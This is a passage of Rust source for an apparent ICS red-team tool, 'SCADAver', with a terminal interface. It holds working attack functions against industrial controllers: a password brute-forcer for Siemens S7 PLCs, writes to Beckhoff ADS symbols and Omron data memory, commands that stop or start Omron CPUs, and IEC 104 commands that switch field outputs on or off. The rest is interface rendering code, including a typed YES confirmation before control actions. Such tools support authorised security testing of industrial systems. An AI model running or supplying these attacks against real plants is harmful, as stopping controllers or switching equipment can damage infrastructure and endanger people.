    use crate::vendors::siemens::s7comm;
    let port = if port == 0 { 102 } else { port };
    out(&format!(
        "[*] Probing {ip}:{port} for S7Comm access protection..."
    ));
    if !s7comm::probe_auth_required(ip, port, 5) {
        out("[*] No access protection detected — no password needed");
        return;
    }
    out("[!] Access protection active — trying passwords...");
    let loaded = creds::load();
    let all_passwords: Vec<&str> = loaded
        .siemens
        .passwords
        .iter()
        .map(std::string::String::as_str)
        .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
        .collect();
    if !loaded.siemens.passwords.is_empty() {
        out(&format!(
            "[*] {} user-supplied + {} built-in passwords",
            loaded.siemens.passwords.len(),
            default_creds::SIEMENS_S7_PASSWORDS.len()
        ));
    }
    for &pw in &all_passwords {
        let display = if pw.is_empty() { "(empty)" } else { pw };
        let state = s7comm::get_cpu_state(ip, port, 5, Some(pw));
        if state != "Unknown" {
            out(&format!("[+] Password accepted: \"{display}\""));
            out(&format!("    CPU State: {state}"));
            return;
        }
    }
    out(&format!(
        "[-] None of the {} passwords worked",
        all_passwords.len()
    ));
    out("    Add custom passwords to ~/.config/scadaver/creds.toml [siemens] section");
}

// ─── Beckhoff write symbol exploit ───────────────────────────────────────────

fn exploit_beckhoff_write_symbol(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::beckhoff::{ads, scan};
    let local_netid = ads::build_local_netid(&local_ip_for(ip));
    let (sym_name, hex_val) = input.split_once('=').unwrap_or((input, "00"));
    let value_bytes: Vec<u8> = hex_val
        .as_bytes()
        .chunks(2)
        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
        .collect();
    if value_bytes.is_empty() {
        out("[-] No valid hex bytes (format: SymbolName=hexvalue)");
        return;
    }
    out(&format!("[*] Discovering {ip} for ADS write..."));
    let Some(dev) = scan::discover_ip_with_port(ip, 3, true, port)
        .ok()
        .and_then(|mut v| {
            if v.is_empty() {
                None
            } else {
                Some(v.remove(0))
            }
        })
    else {
        out("[-] No Beckhoff device responded");
        return;
    };
    out(&format!(
        "[*] Writing symbol '{sym_name}' ({} bytes)...",
        value_bytes.len()
    ));
    match scan::write_symbol_value(&dev, &local_netid, sym_name, value_bytes, port) {
        Ok(true) => out("[+] Symbol written"),
        Ok(false) => out("[!] Write sent — ADS error code returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Omron FINS exploits ──────────────────────────────────────────────────────

fn exploit_omron_info(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Getting Omron device info from {ip}..."));
    match fins::get_device_info_tcp(ip, port) {
        Ok(dev) => {
            out(&format!("  Model:    {}", dev.model));
            out(&format!("  Version:  {}", dev.version));
            out(&format!("  Node:     0x{:02x}", dev.node_addr));
            out("[+] Device info retrieved");
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_read_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    let (start_s, count_s) = input.split_once(':').unwrap_or(("0", "10"));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let count = count_s.trim().parse::<u16>().unwrap_or(10).min(100);
    out(&format!(
        "[*] Reading DM{start}..DM{} from {ip}...",
        start + count - 1
    ));
    match fins::read_dm_words(ip, port, 0, start, count) {
        Ok(vals) => {
            out(&format!("  {:<8}  {:<8}  {}", "Address", "Dec", "Hex"));
            out(&format!("  {:─<8}  {:─<8}  {:─<6}", "", "", ""));
            for (i, &v) in vals.iter().enumerate() {
                out(&format!("  DM{:<6}  {:<8}  {v:#06x}", start + u16::try_from(i).unwrap_or(u16::MAX), v));
            }
            out(&format!("[+] {} word(s)", vals.len()));
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_write_dm(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    let (start_s, vals_s) = input.split_once(':').unwrap_or(("0", input));
    let start = start_s.trim().parse::<u16>().unwrap_or(0);
    let values: Vec<u16> = vals_s
        .split(',')
        .filter_map(|s| s.trim().parse::<u16>().ok())
        .collect();
    if values.is_empty() {
        out("[-] No valid values provided (format: start:v0,v1,...)");
        return;
    }
    out(&format!(
        "[*] Writing {} DM word(s) at DM{start} on {ip}...",
        values.len()
    ));
    match fins::write_dm_words(ip, port, 0, start, &values) {
        Ok(()) => out("[+] DM words written"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_status(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Reading CPU status from {ip}..."));
    match fins::get_cpu_state(ip, port, 0) {
        Ok(state) => out(&format!("[+] CPU State: {state}")),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_run(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!(
        "[*] Setting Omron CPU to RUN (Monitor mode) on {ip}..."
    ));
    match fins::set_cpu_mode(ip, port, 0, true) {
        Ok(true) => out("[+] CPU set to Monitor/Run mode"),
        Ok(false) => out("[!] Command sent — FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_omron_cpu_stop(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::omron::fins;
    out(&format!("[*] Setting Omron CPU to STOP on {ip}..."));
    match fins::set_cpu_mode(ip, port, 0, false) {
        Ok(true) => out("[+] CPU stopped"),
        Ok(false) => out("[!] Command sent — FINS error returned"),
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── IEC 60870-5-104 exploits ─────────────────────────────────────────────────

fn exploit_iec104_gi(ip: &str, port: u16, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    out(&format!("[*] IEC 104 General Interrogation to {ip}..."));
    match client::connect(ip, port) {
        Ok(mut sess) => {
            out("[+] STARTDT confirmed");
            match client::general_interrogation(&mut sess) {
                Ok(objs) => {
                    for obj in &objs {
                        out(&format!(
                            "  IOA {:>6}: type=0x{:02x} data={:?}",
                            obj.ioa, obj.type_id, obj.value
                        ));
                    }
                    out(&format!("[+] {} object(s) returned", objs.len()));
                }
                Err(e) => out(&format!("[-] GI failed: {e}")),
            }
        }
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_sc_on(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!(
        "[*] IEC 104 Single Command ON to IOA {ioa} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, true) {
            Ok(true) => out("[+] Single Command ON confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_sc_off(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let ioa = input.trim().parse::<u32>().unwrap_or(1);
    out(&format!(
        "[*] IEC 104 Single Command OFF to IOA {ioa} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::single_command(&mut sess, ioa, false) {
            Ok(true) => out("[+] Single Command OFF confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

fn exploit_iec104_dc(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
    use crate::vendors::iec104::client;
    let (ioa_s, state_s) = input.split_once(':').unwrap_or((input, "2"));
    let ioa = ioa_s.trim().parse::<u32>().unwrap_or(1);
    let state = state_s.trim().parse::<u8>().unwrap_or(2).clamp(1, 3);
    let state_name = match state {
        1 => "OFF",
        2 => "ON",
        _ => "INDETERMINATE",
    };
    out(&format!(
        "[*] IEC 104 Double Command IOA {ioa} state={state_name} on {ip}..."
    ));
    match client::connect(ip, port) {
        Ok(mut sess) => match client::double_command(&mut sess, ioa, state) {
            Ok(true) => out("[+] Double Command confirmed"),
            Ok(false) => out("[!] Command sent — negative confirmation"),
            Err(e) => out(&format!("[-] {e}")),
        },
        Err(e) => out(&format!("[-] {e}")),
    }
}

// ─── Rendering ───────────────────────────────────────────────────────────────

fn draw(frame: &mut Frame, app: &mut App) {
    let size = frame.area();
    let root = Layout::default()
        .direction(Direction::Vertical)
        .constraints([
            Constraint::Length(3),
            Constraint::Min(0),
            Constraint::Length(5),
        ])
        .split(size);

    draw_header(frame, root[0], app);
    if app.mode == Mode::OutputZoom {
        draw_output_zoom(frame, root[1], app);
    } else {
        draw_main(frame, root[1], app);
    }
    draw_log_strip(frame, root[2], app);

    match app.mode {
        Mode::ScanMenu => draw_scan_menu(frame, size, app),
        Mode::Help => draw_help(frame, size),
        Mode::ExploitInput => draw_exploit_input_popup(frame, size, app),
        Mode::ExploitConfirm => draw_exploit_confirm_popup(frame, size, app),
        Mode::VendorPicker => draw_vendor_picker(frame, size, app),
        _ => {}
    }

    if app.quit_confirm {
        draw_quit_confirm(frame, size);
    }
}

fn draw_header(frame: &mut Frame, area: Rect, app: &App) {
    let scan_tag = if app.active_jobs > 0 {
        format!(" \u{25cf} {} RUNNING", app.active_jobs)
    } else {
        String::new()
    };
    let title = format!(" SCADAver ICS Red Team Tool v1.0{scan_tag} ");
    let keys = match app.mode {
        Mode::Normal =>
            " [A] Add IP  [S] Scan  [E] Exploit  [R] Rescan  [D] Delete  [/] Search  [O] Zoom  [C] Clear output  [?] Help  [Q] Quit",
        Mode::IpInput => " Enter IP address \u{2014} [ESC] cancel",
        Mode::ExploitMenu => " [J/K] Navigate  [ENTER] Run  [V] View as protocol  [O] Zoom  [PgUp/PgDn] Scroll  [ESC] back",
        Mode::Search => " Type to filter \u{2014} [ESC] clear  [ENTER] confirm",
        Mode::ExploitInput => " Enter parameter \u{2014} [ENTER] run  [ESC] cancel",
        Mode::ExploitConfirm => " Type YES to confirm action \u{2014} [ENTER] confirm  [ESC] cancel",
        Mode::OutputZoom => " [J/K/PgUp/PgDn] Scroll  [G] Bottom  [g] Top  [C] Clear  [O/ESC] Close",
        _ => " [ESC / ?] back",
    };

    let text = vec![
        Line::from(Span::styled(
            title,
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(keys, Style::default().fg(Color::DarkGray))),
    ];
    let para = Paragraph::new(text).block(
        Block::default()
            .borders(Borders::ALL)
            .border_style(Style::default().fg(Color::Cyan)),
    );
    frame.render_widget(para, area);
}

fn draw_main(frame: &mut Frame, area: Rect, app: &mut App) {
    let chunks = Layout::default()
        .direction(Direction::Horizontal)
        .constraints([Constraint::Percentage(28), Constraint::Percentage(72)])
        .split(area);
    draw_device_list(frame, chunks[0], app);
    draw_right_panel(frame, chunks[1], app);
}

fn vendor_color(vendor: &str) -> Color {
    match vendor.to_lowercase().as_str() {
        "beckhoff" => Color::Cyan,
        "siemens" => Color::Blue,
        "rockwell" | "enip" => Color::Yellow,
        "schneider" | "modicon" => Color::Green,
        "mitsubishi" => Color::Magenta,
        "phoenix" => Color::Red,
        "ewon" => Color::White,
        "omron" => Color::LightYellow,
        "iec104" => Color::LightCyan,
        _ => Color::Gray,
    }
}

fn draw_device_list(frame: &mut Frame, area: Rect, app: &mut App) {
    let filter_label = if app.filter.is_empty() {
        String::new()
    } else {
        format!(" [/{}]", app.filter)
    };
    let title = format!(" Devices ({}){filter_label} ", app.filtered_indices.len());

    let items: Vec<ListItem> = app
        .filtered_indices
        .iter()
        .map(|&idx| {
            let dev = &app.devices[idx];
            let c = vendor_color(&dev.vendor);
            let mut name = dev.vendor.clone();
            if let Some(s) = name.get_mut(0..1) {
                s.make_ascii_uppercase();
            }
            ListItem::new(vec![
                Line::from(Span::styled(
                    format!(" {} ", dev.ip),
                    Style::default().fg(c).add_modifier(Modifier::BOLD),
                )),
                Line::from(Span::styled(
                    format!("  {name}"),
                    Style::default().fg(Color::DarkGray),
                )),
                Line::from(Span::styled(
                    format!("  {}", dev.last_seen_str()),
                    Style::default().fg(Color::DarkGray),
                )),
            ])
        })
        .collect();

    let list = List::new(items)
        .block(
            Block::default()
                .title(title.as_str())
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Cyan)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::DarkGray)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, area, &mut app.list_state);
}

fn draw_right_panel(frame: &mut Frame, area: Rect, app: &App) {
    match app.mode {
        Mode::ExploitMenu | Mode::ExploitInput | Mode::ExploitConfirm => {
            draw_exploit_menu(frame, area, app);
        }
        Mode::IpInput => draw_ip_input(frame, area, app),
        Mode::Search => draw_search_panel(frame, area, app),
        _ => draw_detail_panel(frame, area, app),
    }
}

fn draw_detail_panel(frame: &mut Frame, area: Rect, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(40), Constraint::Percentage(60)])
        .split(area);

    let info_text = match app.selected_device() {
        Some(dev) => {
            let mut lines = vec![
                Line::from(vec![
                    Span::styled(" IP:       ", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        &dev.ip,
                        Style::default()
                            .fg(Color::Cyan)
                            .add_modifier(Modifier::BOLD),
                    ),
                ]),
                Line::from(vec![
                    Span::styled(" Vendor:   ", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        dev.vendor.to_uppercase(),
                        Style::default().fg(vendor_color(&dev.vendor)),
                    ),
                ]),
                Line::from(vec![
                    Span::styled(" Last seen:", Style::default().fg(Color::DarkGray)),
                    Span::styled(
                        format!(" {}", dev.last_seen_str()),
                        Style::default().fg(Color::Gray),
                    ),
                ]),
                Line::from(""),
            ];
            append_capability_lines(dev, &mut lines);
            if let Value::Object(map) = &dev.fields {
                for (k, v) in map {
                    let val_str = match v {
                        Value::String(s) if !s.is_empty() => s.clone(),
                        Value::Null | Value::String(_) => continue,
                        other => other.to_string(),
                    };
                    lines.push(Line::from(vec![
                        Span::styled(format!(" {k}:"), Style::default().fg(Color::DarkGray)),
                        Span::styled(format!(" {val_str}"), Style::default().fg(Color::White)),
                    ]));
                }
            }
            lines.push(Line::from(""));
            lines.push(Line::from(Span::styled(
                " [E] Exploit menu  [R] Rescan  [D] Delete",
                Style::default().fg(Color::Yellow),
            )));
            lines
        }
        None => vec![
            Line::from(""),
            Line::from(Span::styled(
                " No device selected.",
                Style::default().fg(Color::DarkGray),
            )),
            Line::from(""),
            Line::from(Span::styled(
                " [A] Add / probe IP   [S] Broadcast scan",
                Style::default().fg(Color::DarkGray),
            )),
        ],
    };

    frame.render_widget(
        Paragraph::new(info_text)
            .block(
                Block::default()
                    .title(" Device Info ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        chunks[0],
    );

    frame.render_widget(
        output_widget(&app.output_lines, chunks[1].height, app.output_scroll),
        chunks[1],
    );
}

fn append_capability_lines(dev: &DeviceRecord, lines: &mut Vec<Line<'_>>) {
    let vendor = dev.vendor.to_ascii_lowercase();
    let caps: &[(&str, CapabilityKey)] = match vendor.as_str() {
        "beckhoff" => &[
            ("ads tcp", CapabilityKey::BeckhoffAds),
            ("udp discovery", CapabilityKey::BeckhoffUdpDiscovery),
            ("web candidate", CapabilityKey::BeckhoffWeb),
        ],
        "siemens" => &[("s7 tcp", CapabilityKey::S7Tcp)],
        "rockwell" | "enip" => &[("ethernet/ip", CapabilityKey::EnipTcp)],
        "schneider" | "modicon" => &[
            ("identity", CapabilityKey::SchneiderIdentity),
            ("modbus tcp", CapabilityKey::SchneiderModbus),
            ("web candidate", CapabilityKey::SchneiderWeb),
        ],
        "mitsubishi" => &[
            ("identity", CapabilityKey::MitsubishiIdentity),
            ("udp control", CapabilityKey::MitsubishiControlUdp),
            ("slmp tcp", CapabilityKey::SlmpTcp),
        ],
        "phoenix" => &[
            ("proconos info", CapabilityKey::PhoenixInfo),
            ("webvisit", CapabilityKey::PhoenixWebVisit),
        ],
        "omron" => &[("fins tcp", CapabilityKey::FinsTcp)],
        "ewon" => &[("http", CapabilityKey::EwonHttp)],
        "iec104" => &[("iec104 tcp", CapabilityKey::Iec104Tcp)],
        _ => &[],
    };
    if caps.is_empty() {
        return;
    }

    lines.push(Line::from(Span::styled(
        " Protocol capabilities:",
        Style::default()
            .fg(vendor_color(&dev.vendor))
            .add_modifier(Modifier::BOLD),
    )));
    for (label, capability) in caps {
        lines.push(capability_line(
            label,
            capability_availability(dev, *capability).enabled,
        ));
    }

    if matches!(vendor.as_str(), "schneider" | "modicon") {
        let caps = SchneiderCapabilities::from_device(dev);
        lines.push(capability_line(
            "udp discovery",
            caps.udp_discovery_confirmed,
        ));
        lines.push(Line::from(vec![
            Span::styled(" modbus port:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                format!(" :{}", caps.modbus_port),
                Style::default().fg(Color::White),
            ),
        ]));
        lines.push(Line::from(vec![
            Span::styled(" web port:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                match caps.web_port {
                    Some(port) => format!(" :{port}"),
                    None if caps.web_candidate() => " :80".to_string(),
                    None => " none".to_string(),
                },
                Style::default().fg(if caps.web_candidate() {
                    Color::White
                } else {
                    Color::DarkGray
                }),
            ),
        ]));
        lines.push(Line::from(vec![
            Span::styled(" fc90 family:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                format!(" {}", caps.fc90_family.label()),
                Style::default().fg(if caps.fc90_family == SchneiderFamily::Unknown {
                    Color::DarkGray
                } else {
                    Color::Yellow
                }),
            ),
        ]));
    }
    lines.push(Line::from(""));
}

fn capability_line<'a>(label: &'static str, yes: bool) -> Line<'a> {
    Line::from(vec![
        Span::styled(format!(" {label}:"), Style::default().fg(Color::DarkGray)),
        Span::styled(
            if yes { " yes" } else { " no" },
            Style::default().fg(if yes { Color::Green } else { Color::DarkGray }),
        ),
    ])
}

fn draw_exploit_menu(frame: &mut Frame, area: Rect, app: &App) {
    let chunks = Layout::default()
        .direction(Direction::Vertical)
        .constraints([Constraint::Percentage(45), Constraint::Percentage(55)])
        .split(area);

    let vendor = app.selected_vendor().unwrap_or_default();
    let port_label = {
        let p = app.action_port(&vendor, app.exploit_sel);
        if p == 0 {
            String::new()
        } else {
            format!(" :{p}")
        }
    };
    let title = match &app.vendor_override {
        None => format!(" Exploits \u{2014} {}{port_label} ", vendor.to_uppercase()),
        Some(ov) => {
            let stored = app
                .selected_device()
                .map(|d| d.vendor.to_uppercase())
                .unwrap_or_default();
            format!(
                " Exploits \u{2014} {stored} [as {}]{port_label} ",
                ov.to_uppercase()
            )
        }
    };

    let items: Vec<ListItem> = app
        .exploit_defs
        .iter()
        .map(|e| {
            let availability = action_availability(app, e);
            let suffix = if availability.enabled {
                match e.risk {
                    ExploitRisk::ReadOnly => String::new(),
                    ExploitRisk::SensitiveRead
                    | ExploitRisk::LongRunning
                    | ExploitRisk::WriteControl => " [confirm]".to_string(),
                }
            } else {
                unavailable_suffix(availability.reason)
            };
            let c = if !availability.enabled || e.label.starts_with('\u{2190}') {
                Color::DarkGray
            } else if e.risk == ExploitRisk::WriteControl {
                Color::Red
            } else if e.risk == ExploitRisk::LongRunning {
                Color::LightYellow
            } else if e.risk == ExploitRisk::SensitiveRead {
                Color::Magenta
            } else if e.needs_input {
                Color::Yellow
            } else {
                Color::White
            };
            ListItem::new(Line::from(Span::styled(
                format!(" {}{} ", e.label, suffix),
                Style::default().fg(c),
            )))
        })
        .collect();

    let mut state = ListState::default();
    state.select(Some(app.exploit_sel));

    let list = List::new(items)
        .block(
            Block::default()
                .title(title.as_str())
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Yellow)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::DarkGray)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");

    frame.render_stateful_widget(list, chunks[0], &mut state);
    frame.render_widget(
        output_widget(&app.output_lines, chunks[1].height, app.output_scroll),
        chunks[1],
    );
}

fn draw_output_zoom(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let total = app.output_lines.len();
    let end = total
        .saturating_sub(app.output_scroll)
        .max(visible.min(total));
    let start = end.saturating_sub(visible);

    let text: Vec<Line> = app.output_lines[start..end]
        .iter()
        .map(|l| {
            let c = if l.starts_with("══") {
                Color::Cyan
            } else if l.trim_start().starts_with("──") {
                Color::DarkGray
            } else if l.starts_with("[+]") {
                Color::Green
            } else if l.starts_with("[-]") {
                Color::Red
            } else if l.starts_with("[!]") {
                Color::Yellow
            } else {
                Color::White
            };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();

    let title = if total == 0 {
        " Output (empty) ".to_string()
    } else if app.output_scroll == 0 {
        format!(" Output \u{2014} {total} lines \u{2014} [O/ESC] close ")
    } else {
        format!(
            " Output \u{2014} {}\u{2013}{}/{} \u{2014} [O/ESC] close ",
            start + 1,
            end,
            total
        )
    };

    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(title)
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn output_widget(lines: &[String], height: u16, scroll: usize) -> Paragraph<'_> {
    let visible = height.saturating_sub(2) as usize;
    let total = lines.len();

    // scroll=0 → auto-scroll to bottom; scroll=N → N lines from the bottom upward
    let end = total.saturating_sub(scroll).max(visible.min(total));
    let start = end.saturating_sub(visible);

    let text: Vec<Line> = lines[start..end]
        .iter()
        .map(|l| {
            let c = if l.starts_with("══") {
                Color::Cyan
            } else if l.trim_start().starts_with("──") {
                Color::DarkGray
            } else if l.starts_with("[+]") {
                Color::Green
            } else if l.starts_with("[-]") {
                Color::Red
            } else if l.starts_with("[!]") {
                Color::Yellow
            } else {
                Color::White
            };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();

    let title = if scroll == 0 || total <= visible {
        if total > visible {
            format!(" Output [{total} lines \u{2191}PgUp] ")
        } else {
            " Output ".to_string()
        }
    } else {
        format!(
            " Output [{}\u{2013}{}/{} \u{2191}\u{2193}PgUp/PgDn] ",
            start + 1,
            end,
            total
        )
    };

    Paragraph::new(text)
        .block(
            Block::default()
                .title(title)
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        )
        .wrap(Wrap { trim: false })
}

fn draw_ip_input(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Enter IP address to probe:",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Cyan)
                .add_modifier(Modifier::BOLD),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Runs auto-detection across all vendors. ENTER to start, ESC to cancel.",
            Style::default().fg(Color::DarkGray),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Add / Probe IP ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Cyan)),
            )
            .wrap(Wrap { trim: false }),
        area,
    );
}

fn draw_search_panel(frame: &mut Frame, area: Rect, app: &App) {
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Filter devices by IP or vendor:",
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  / {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Green)
                .add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Search ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Green)),
        ),
        area,
    );
}

fn draw_log_strip(frame: &mut Frame, area: Rect, app: &App) {
    let visible = area.height.saturating_sub(2) as usize;
    let text: Vec<Line> = app
        .logs
        .iter()
        .rev()
        .take(visible)
        .rev()
        .map(|l| {
            let c = if l.starts_with("[+]") {
                Color::Green
            } else if l.starts_with("[-]") {
                Color::Red
            } else if l.starts_with("[!]") {
                Color::Yellow
            } else {
                Color::DarkGray
            };
            Line::from(Span::styled(l.as_str(), Style::default().fg(c)))
        })
        .collect();
    frame.render_widget(
        Paragraph::new(text).block(
            Block::default()
                .title(" Activity Log ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::DarkGray)),
        ),
        area,
    );
}

fn draw_scan_menu(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(52, 50, area);
    frame.render_widget(Clear, popup);

    let items: Vec<ListItem> = SCAN_ITEMS
        .iter()
        .map(|s| {
            let c = if s.starts_with('\u{2190}') {
                Color::DarkGray
            } else {
                Color::White
            };
            ListItem::new(Line::from(Span::styled(
                format!("  {s}  "),
                Style::default().fg(c),
            )))
        })
        .collect();
    let mut state = ListState::default();
    state.select(Some(app.scan_menu_sel));

    let list = List::new(items)
        .block(
            Block::default()
                .title(" Broadcast Scan ")
                .borders(Borders::ALL)
                .border_style(Style::default().fg(Color::Cyan)),
        )
        .highlight_style(
            Style::default()
                .bg(Color::DarkGray)
                .add_modifier(Modifier::BOLD),
        )
        .highlight_symbol("\u{25b6} ");
    frame.render_stateful_widget(list, popup, &mut state);
}

fn draw_exploit_input_popup(frame: &mut Frame, area: Rect, app: &App) {
    let hint = app
        .exploit_defs
        .get(app.exploit_sel)
        .map_or("parameter", |e| e.input_hint);
    let popup = centered_rect(60, 25, area);
    frame.render_widget(Clear, popup);

    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            format!(" Enter {hint}:"),
            Style::default().fg(Color::DarkGray),
        )),
        Line::from(""),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default()
                .fg(Color::Yellow)
                .add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Exploit Parameter ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Yellow)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_exploit_confirm_popup(frame: &mut Frame, area: Rect, app: &App) {
    let popup = centered_rect(64, 34, area);
    frame.render_widget(Clear, popup);
    let pending = app.pending_exploit.as_ref();
    let label = pending.map_or("action", |p| p.label.as_str());
    let ip = pending.map_or("-", |p| p.ip.as_str());
    let port = pending.map_or(0, |p| p.port);
    let input = pending
        .and_then(|p| {
            if p.input.trim().is_empty() {
                None
            } else {
                Some(p.input.as_str())
            }
        })
        .unwrap_or("-");
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " This action may write, control, or run for a long time.",
            Style::default().fg(Color::Yellow),
        )),
        Line::from(""),
        Line::from(vec![
            Span::styled(" Action:", Style::default().fg(Color::DarkGray)),
            Span::styled(format!(" {label}"), Style::default().fg(Color::White)),
        ]),
        Line::from(vec![
            Span::styled(" Target:", Style::default().fg(Color::DarkGray)),
            Span::styled(
                if port == 0 {
                    format!(" {ip}")
                } else {
                    format!(" {ip}:{port}")
                },
                Style::default().fg(Color::White),
            ),
        ]),
        Line::from(vec![
            Span::styled(" Input: ", Style::default().fg(Color::DarkGray)),
            Span::styled(input.to_string(), Style::default().fg(Color::White)),
        ]),
        Line::from(""),
        Line::from(Span::styled(
            " Type YES and press ENTER to continue.",
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            format!("  > {}\u{2588}", app.input_buf),
            Style::default().fg(Color::Red).add_modifier(Modifier::BOLD),
        )),
    ];
    frame.render_widget(
        Paragraph::new(text)
            .block(
                Block::default()
                    .title(" Confirm Action ")
                    .borders(Borders::ALL)
                    .border_style(Style::default().fg(Color::Red)),
            )
            .wrap(Wrap { trim: false }),
        popup,
    );
}

fn draw_help(frame: &mut Frame, area: Rect) {
    let popup = centered_rect(58, 75, area);
    frame.render_widget(Clear, popup);

    let s = Style::default();
    let text = vec![
        Line::from(""),
        Line::from(Span::styled(
            " Navigation",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  J / \u{2193}    Next device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  K / \u{2191}    Prev device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  /        Search / filter",
            s.fg(Color::White),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Device Actions",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  A        Add / probe single IP",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "           Forms: IP, IP:1502 tcp, IP:5007 mitsubishi, IP:48898 beckhoff",
            s.fg(Color::DarkGray),
        )),
        Line::from(Span::styled(
            "  S        Broadcast scan (all or by vendor)",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  E        Open exploit menu for selected device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  R        Rescan selected device",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  D        Delete selected device from database",
            s.fg(Color::White),
        )),
        Line::from(""),
        Line::from(Span::styled(
            " Exploit Menu",
            s.fg(Color::Cyan).add_modifier(Modifier::BOLD),
        )),
        Line::from(Span::styled(
            "  J/K      Navigate exploit list",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  ENTER    Run selected exploit",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  V        View as a different protocol",
            s.fg(Color::White),
        )),
        Line::from(Span::styled(
            "  Yellow   Exploit requires input parameter",
            s.fg(Color::Yellow),
        )),
